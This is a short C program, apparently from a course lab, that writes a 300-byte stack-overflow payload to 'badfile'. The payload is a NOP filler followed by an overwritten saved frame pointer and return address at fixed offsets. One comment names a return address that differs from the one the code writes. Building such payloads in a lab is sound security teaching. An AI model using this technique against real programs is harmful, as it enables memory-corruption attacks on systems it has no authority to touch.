#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

#define BUF_SIZE 300

// Offsets from cmsc426() stack analysis:
//   - (rbp) at offset 224
//   - (rbp + 8) at offset 232
#define OFFSET_SAVED_RBP  224
#define OFFSET_RET_ADDR   232

int main() {
    // Create a 300-byte buffer
    char buf[BUF_SIZE];

    // 1) Fill with 0x90 (NOP) or any filler pattern
    memset(buf, 0x90, sizeof(buf));

    // 2) Overwrite (rbp) with the old %rbp from main:
    //    You found it to be 0x7fffffffe360 in your GDB session:
    *(uint64_t *)(buf + 224) = 0x7fffffffe360ULL;

    // 3) Overwrite (rbp+8) with the instruction in main() *after* call TU():
    //    Disassembly showed call at 0x5555555552a7, so next is 0x5555555552ac
    *(uint64_t *)(buf + 232)  = 0x5555555552ceULL;

    // (Optional) Overwrite local int n if needed.
    // If you discovered n is at offset e.g. 220, do:
    //   *(int *)(buf + 220) = 2; // triggers “Improper return” in main()

    // 4) Write out the malicious buffer to "badfile"
    FILE *fp = fopen("badfile", "w");
    if (!fp) {
        perror("fopen");
        return 1;
    }
    fwrite(buf, BUF_SIZE, 1, fp);
    fclose(fp);

    printf("Created badfile with offsets (rbp=%d, ret=%d)\n",
           OFFSET_SAVED_RBP, OFFSET_RET_ADDR);
    return 0;
}

